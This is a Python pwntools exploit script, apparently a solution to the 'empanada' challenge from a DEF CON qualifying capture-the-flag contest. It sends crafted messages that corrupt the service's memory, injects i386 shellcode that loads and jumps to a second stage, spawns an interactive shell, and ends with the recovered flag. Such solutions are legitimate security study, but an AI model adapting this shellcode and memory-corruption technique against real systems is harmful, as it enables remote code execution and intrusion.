#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools

if "remote" in sys.argv:
    r = remote("empanada_45e50f0410494ec9cfb90430d2e86287.quals.shallweplayaga.me", 47281)
else:
    r = process("./empanada")

T_CLIENT =  0x80
RMALL =     chr(0x00)
STORE =     chr(0x10)
HSUM =      chr(0x20)
GET =       chr(0x30)
COUNT =     chr(0x40)
DEL =       chr(0x50)
GETALL =    chr(0x60)
CLEAR =     chr(0xfe)
TERMINATE = chr(0xff)

def MSG(type, idx, size):
    return chr(type | idx << 5 | size)

def Send(data, idx=0, type=T_CLIENT):
    r.send(MSG(type, idx, len(data)))
    r.send(data)

Send(STORE + "1" * 23, 1) # p1
Send("A" * 13 + p32(0x31337178) + "A" * 5)

Send(STORE + "2" * 10, 1) # p2
Send("5" * 31)

Send(STORE + "3" * 10, 1) # p3
Send("6" * 5, 0, 0)

sc = asm("""
    mov eax, 3
    xor ebx, ebx
    mov ecx, 0x31337000
    mov edx, 100
    int 0x80

    push 0x31337000
    ret 
    """)

Send(STORE + sc)

Send(DEL + "\x01")
Send(CLEAR)
Send(GET + "\x00")
Send(HSUM + "\x01")

r.sendline(asm(shellcraft.i386.sh()))
r.interactive()

# The flag is: 7457y_l471n_4m3r1c4n_7r347_0r_d00msd4y_d3v1c3

